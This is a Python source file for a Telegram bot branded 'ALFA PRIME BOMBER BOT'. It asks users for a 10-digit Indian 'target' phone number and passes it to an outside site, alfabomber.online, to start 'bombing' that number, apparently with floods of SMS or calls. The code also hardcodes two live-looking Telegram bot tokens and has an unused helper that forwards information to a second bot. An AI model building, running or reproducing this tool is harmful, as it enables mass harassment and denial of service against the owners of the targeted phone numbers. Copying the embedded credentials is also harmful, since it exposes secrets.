import sys
import telebot
import requests
from flask import Flask, request
from telebot import types

token = '5893052312:AAEH_T8PKjKb7chsCUfj12wWyMQ-EulTtEc'
another_bot_token = '6210416738:AAGX7rwMp97KuCzzZuZGaJjD0rnFzjs57a0'
bot = telebot.TeleBot(token)
send_requests = True
active_users = set()  # Change to a set for efficient membership checks


@bot.message_handler(commands=["start"])
def start(message):
    global active_users
    channel_username = "Hackeroffline"
    programmer_username = "Alfabomber"

    active_users.add(message.chat.id)  # Use add() for sets

    channel_link = f"https://t.me/{channel_username}"
    programmer_link = f"https://t.me/{programmer_username}"

    channel_button = types.InlineKeyboardButton(text="🧑‍💻 Official Channel", url=channel_link)
    programmer_button = types.InlineKeyboardButton(text="🎁 Developer", url=programmer_link)
    keyboards = types.InlineKeyboardMarkup()
    keyboards.row_width = 2
    keyboards.add(programmer_button, channel_button)

    welcome_message = (
        f'''Hello {message.from_user.first_name}!

Welcome to ALFA PRIME BOMBER BOT!

⚠️ Note - Enter Only 10 Digital Number Don't Add Country Code

 📥 Enter Target Number -''')
    bot.send_message(message.chat.id, welcome_message, parse_mode="html", reply_markup=keyboards)


@bot.message_handler(func=lambda m: True)
def sp(message):
    global active_users

    if message.chat.id not in active_users:
        active_users.add(message.chat.id)

    if send_requests:
        bot.send_message(message.chat.id, "⏳ Ok Wait Bombing Started Soon...🔄", parse_mode="markdown")

        if not message.text.isdigit() or len(message.text) != 10:
            bot.send_message(message.chat.id, "❌ Send Only 10 Digits Number\n\nDon't Add +91", parse_mode="markdown")
            return

        bot.send_message(message.chat.id, "<strong>⚠️ Note - Click /stop For Stop Bomber 💣</strong>", parse_mode="html")
        url = "https://alfabomber.online/urls/Url.php??"
        params = {
            "alfabomb": message.text,
            "submit": "Submit"
        }
        payload = {
            "mobile": message.text
        }
        response = requests.get(url, params=params)

        # ... rest of your code ...

        bot.send_message(message.chat.id, "✅ Done Send!", parse_mode="markdown")


def send_to_another_bot(info):
    url = f'https://api.telegram.org/bot{another_bot_token}/sendMessage'
    data = {
        'chat_id': 'ANOTHER_BOT_CHAT_ID',  # Replace with the chat ID of the receiving bot
        'text': info
    }
    response = requests.post(url, data=data)


app = Flask(__name__)

@app.route(f'/{bot.token}', methods=['POST'])
def handle_bot_update():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK"

if __name__ == "__main__":
    bot.remove_webhook()
    print(f"Bomber Telegram Bot is running...\n")
    bot.polling(none_stop=True)

